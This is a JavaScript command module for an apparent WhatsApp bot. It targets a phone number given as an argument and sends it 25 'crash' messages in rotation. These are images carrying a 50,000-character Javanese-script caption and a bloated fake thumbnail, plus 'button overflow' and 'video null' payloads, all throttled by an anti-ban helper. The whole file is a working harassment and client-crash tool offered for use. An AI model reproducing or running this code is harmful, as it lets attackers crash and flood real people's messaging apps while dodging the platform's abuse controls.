'use strict';
const { MadaraEye } = require('../../lib/madaraEye');
const { createProgressBar } = require('../../lib/progressBar');
const { canCrash, recordCrash } = require('../../lib/antiBan');

module.exports = {
    name: 'preview',
    aliases: ['linkpreview', 'previewloop', 'hybrid'],
    category: 'madaraeye',
    desc: 'ʜʏʙʀɪᴅ ᴄʀᴀsʜ — ɪᴍᴀɢᴇ + ʙᴜᴛᴛᴏɴ + ᴠɪᴅᴇᴏ ᴄᴏᴍʙᴏ',
    usage: '.preview <number>',
    waitReact: true,

    async execute(sock, msg, args, ctx) {
        const s = ctx.settings;
        const prefix = s.prefix || '.';
        const phone = sock._sessionPhone || sock.user?.id?.split(':')[0] || 'default';
        if (!args[0]) return sock.sendMessage(ctx.from, { text: `❌ *Usage:* ${prefix}preview <number>` }, { quoted: msg });
        const target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        let eye = global.getMadaraEye?.(sock) || new MadaraEye(sock);
        const TOTAL = 25;
        const bar = createProgressBar(sock, ctx.from, TOTAL, msg);
        
        const JAVA = "ꦾ";
        const jawaText = JAVA.repeat(50000);
        
        try {
            for (let i = 0; i < TOTAL; i++) {
                let allowed = false;
                while (!allowed) {
                    try { await canCrash(phone); allowed = true; }
                    catch (e) {
                        const waitMatch = e.message.match(/(\d+)s/);
                        const waitSec = waitMatch ? parseInt(waitMatch[1]) : 15;
                        await bar.setPhase(`⏳ ${e.message}`);
                        const chunks = Math.ceil(waitSec / 5);
                        for (let c = 0; c < chunks; c++) {
                            await new Promise(r => setTimeout(r, 5000));
                            await bar.setPhase(`⏳ ᴄᴏᴏʟᴅᴏᴡɴ: ${Math.max(0, waitSec - (c + 1) * 5)}s`);
                        }
                    }
                }
                
                // ── Cycle through 3 attack types ────────────────────────
                if (i % 3 === 0) {
                    // Attack 1: Image + Javanese caption
                    await sock.sendMessage(target, {
                        image: { url: 'https://d.top4top.io/p_3829n9zbt1.jpg' },
                        caption: `MADARA EYE\n${jawaText}`,
                        jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/' + 'A'.repeat(50000), 'base64'),
                        contextInfo: { mentionedJid: [target], forwardingScore: 999, isForwarded: true }
                    }).catch(() => {});
                    await bar.update(1, 'ɪᴍᴀɢᴇ + ᴊᴀᴠᴀɴᴇsᴇ');
                    
                } else if (i % 3 === 1) {
                    // Attack 2: Button overflow
                    await eye.buttonOverflow(target);
                    await bar.update(1, 'ʙᴜᴛᴛᴏɴ ᴏᴠᴇʀғʟᴏᴡ');
                    
                } else {
                    // Attack 3: Video null
                    await eye.vidxNull(target);
                    await bar.update(1, 'ᴠɪᴅᴇᴏ ɴᴜʟʟ');
                }
                
                await recordCrash(phone);
            }
            await bar.done(`✅ ʜʏʙʀɪᴅ ᴄʀᴀsʜ ᴄᴏᴍᴘʟᴇᴛᴇ\n📊 ${TOTAL} ᴘᴀʏʟᴏᴀᴅs\n🎯 ${target}`);
        } catch (e) { await bar.done(`❌ ${e.message}`); }
    }
};